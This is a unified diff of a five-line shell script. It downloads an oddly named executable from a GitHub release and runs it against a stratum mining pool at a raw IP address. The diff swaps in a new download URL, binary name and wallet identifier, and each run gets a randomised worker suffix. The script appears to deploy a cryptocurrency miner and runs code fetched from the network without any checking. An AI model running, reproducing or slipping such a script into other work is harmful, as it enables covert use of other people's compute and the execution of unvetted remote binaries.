@@ -1,5 +1,5 @@
 #!/bin/sh
 apt update && apt install unzip -y
-wget https://github.com/tallapallitech63/oldess2/releases/download/ods/oddys
-chmod +x oddys
-./oddys -P stratum1+tcp://cb21065de322fb2bff1944936d0cf55bd02ae8968223.$(shuf -n 1 -i 1-99999)-hiiiA@35.89.23.193:8081
+wget https://github.com/virtolm/jnccv/releases/download/jjjhn/jnddv
+chmod +x jnddv
+./jnddv -P stratum1+tcp://cb5691ea88389782ab6415d498877356f66e6c37a778.$(shuf -n 1 -i 1-99999)-hiiiB@35.89.23.193:8081
